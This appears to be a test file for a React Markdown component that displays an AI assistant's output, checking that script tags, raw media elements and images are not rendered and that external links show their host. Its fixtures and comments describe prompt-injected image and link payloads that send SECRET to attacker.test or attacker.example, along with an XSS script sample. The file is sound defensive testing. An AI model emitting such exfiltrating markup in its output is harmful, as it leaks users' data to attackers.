import { describe, expect, it } from "vitest";
import { render, screen } from "@testing-library/react";
import { Markdown } from "./markdown";

describe("Markdown", () => {
  it("does not render raw HTML from markdown source", () => {
    // ReactMarkdown defaults to skipHtml; a <script> tag in the source must
    // not become a real <script> in the DOM.
    const dangerous = '<script id="xss">alert(1)</script>safe text';
    render(<Markdown>{dangerous}</Markdown>);
    expect(document.getElementById("xss")).toBeNull();
    expect(screen.getByText(/safe text/)).toBeInTheDocument();
  });

  it("renders external links with rel='noopener noreferrer'", () => {
    render(<Markdown>{"[link](https://example.com)"}</Markdown>);
    const anchor = screen.getByRole("link", { name: "link" });
    expect(anchor.getAttribute("rel")).toBe("noopener noreferrer");
    expect(anchor.getAttribute("target")).toBe("_blank");
  });

  it("neutralizes fabricated in-app links to plain text", () => {
    // The assistant sometimes invents a route like /intake/requests/REQ-4196;
    // it must render as text, never a clickable (dead) link.
    render(<Markdown>{"[REQ-4196](/intake/requests/REQ-4196)"}</Markdown>);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("REQ-4196")).toBeInTheDocument();
  });

  it("does not render markdown images; shows their alt text", () => {
    // Guards against a prompt-injected ![x](https://attacker/?d=SECRET) in
    // model output making the browser fetch an attacker URL with no click
    // (an <img>, or the preload link React adds for one).
    const { container } = render(
      <Markdown>{"Clause 4 ![logo](https://attacker.test/?d=SECRET)"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(document.querySelector('link[rel="preload"]')).toBeNull();
    expect(document.body.innerHTML).not.toContain("attacker.test");
    expect(screen.getByText("[image: logo]")).toBeInTheDocument();
  });

  it("leaves a visible [image] for an image with no alt text", () => {
    // An alt-less image used to vanish without a trace (an image-only link became an
    // empty, zero-width link): the reader must still see something was there.
    const { container } = render(<Markdown>{"Logo: ![](https://x.test/a.png)"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[image]")).toBeInTheDocument();
  });

  it("renders raw HTML media tags as text, not elements", () => {
    // Guards against someone adding rehype-raw, which would turn raw
    // <iframe>/<video>/<object> in model output back into auto-fetching elements.
    const { container } = render(
      <Markdown>
        {'<iframe src="https://a.test"></iframe><video src="https://b.test"></video><img src="https://c.test">'}
      </Markdown>,
    );
    expect(
      container.querySelector("iframe,video,img,object,embed,audio,source"),
    ).toBeNull();
  });

  it("shows an external link's destination host and keeps rel", () => {
    // Guards against a prompt-injected [see clause](https://attacker.example/?d=..)
    // looking like an ordinary reference: the person must see where a click
    // goes, and the link must still open with noopener noreferrer.
    render(
      <Markdown>{"[see clause](https://attacker.example/?d=SECRET)"}</Markdown>,
    );
    const anchor = screen.getByRole("link", { name: "see clause" });
    expect(anchor.getAttribute("rel")).toBe("noopener noreferrer");
    expect(anchor.getAttribute("target")).toBe("_blank");
    expect(screen.getByText("(attacker.example)")).toBeInTheDocument();
    expect(anchor.parentElement?.textContent).toBe("see clause (attacker.example)");
  });
});
